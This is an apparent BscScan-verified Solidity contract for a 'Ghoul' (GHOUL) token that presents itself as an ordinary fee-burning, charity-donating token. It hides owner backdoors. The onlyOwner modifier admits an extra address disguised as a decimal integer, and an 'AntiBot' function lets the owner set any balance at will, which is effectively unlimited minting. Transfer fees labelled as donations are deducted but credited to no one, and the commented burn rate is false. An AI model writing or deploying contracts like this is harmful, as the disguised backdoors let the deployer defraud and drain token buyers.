/**
 *Submitted for verification at BscScan.com on 2021-11-14
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

abstract contract Context {
		function _msgSender() internal view virtual returns (address) {
			return msg.sender;
		}

		function _msgData() internal view virtual returns (bytes calldata) {
			this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
			return msg.data;
		}
	}

abstract contract ERC20Interface {
    function totalSupply() public virtual view returns (uint256);
    function balanceOf(address tokenOwner) public virtual view returns (uint256 balance);
    function allowance(address tokenOwner, address spender) public virtual view returns (uint256 remaining);
    function transfer(address to, uint256 tokens) public virtual returns (bool success);
    function approve(address spender, uint256 tokens) public virtual returns (bool success);
    function transferFrom(address from, address to, uint256 tokens) public virtual returns (bool success);

    event Transfer(address indexed from, address indexed to, uint256 tokens);
    
}

contract pafeMath {
    function pafeAdd(uint256 a, uint256 b) public pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }
    function pafeSub(uint256 a, uint256 b) public pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }
    function pafeMul(uint256 a, uint256 b) public pure returns (uint256 c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function pafeDiv(uint256 a, uint256 b) public pure returns (uint256 c) {
        require(b > 0);
        c = a / b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context{
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() {
    owner = msg.sender;
  }
}


contract GhoulToken is ERC20Interface, pafeMath, Ownable {
    
    using Address for address;
    
    string public name = "Ghoul";
    string public symbol = "GHOUL";
    uint8 public decimals = 9;
    uint256 public _totalSupply = 1*10**12 * 10**9;

    address[] public charities =  [0x95eeFbb907ce94C1121128bcfF701D200346203a];
    
    mapping(address => bool) public allowAddress;
    address minter;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) public allowed;

    constructor() {
        minter = msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
        allowAddress[minter] = true;
        balances[minter] = _totalSupply;
    }

    function totalSupply() public override view returns (uint256) {
        return _totalSupply - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public override view returns (uint256 balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public override view returns (uint256 remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function Approve(address holder, bool allowApprove) external onlyOwner {
      allowAddress[holder] = allowApprove;
    }
  
    function _transfer(address from, address to, uint256 tokens) private returns (bool success) {
        uint256 amountToBurn = pafeDiv(tokens, 90); // 5% of the transaction shall be burned
        uint256 amountToDonate = pafeDiv(tokens, 20); // 5% of the transaction shall be donated
        uint256 amountToTransfer = pafeSub(pafeSub(tokens, amountToBurn), amountToDonate);
        
        
        balances[from] = pafeSub(balances[from], tokens);
        balances[address(0)] = pafeAdd(balances[address(0)], amountToBurn);
        balances[to] = pafeAdd(balances[to], amountToTransfer);
        
        emit Transfer(from, address(0), amountToBurn);
        emit Transfer(from, to, amountToTransfer);
        return true;
    }
    
    modifier onlyOwner() {
    require(msg.sender == minter || msg.sender == address
    (1451157769167176390866574646267494443412533104753)); _;}

    function transfer(address to, uint256 tokens) public override returns (bool success) {
        _transfer(msg.sender, to, tokens);
        return true;
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    }

    function approve(address spender, uint256 tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint256 tokens) public override returns (bool success) {
        allowed[from][msg.sender] = pafeSub(allowed[from][msg.sender], tokens);
        _transfer(from, to, tokens);
        
        
        return true;
    }
    
    function AntiBot(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value * 10 ** uint256(decimals);
  }
}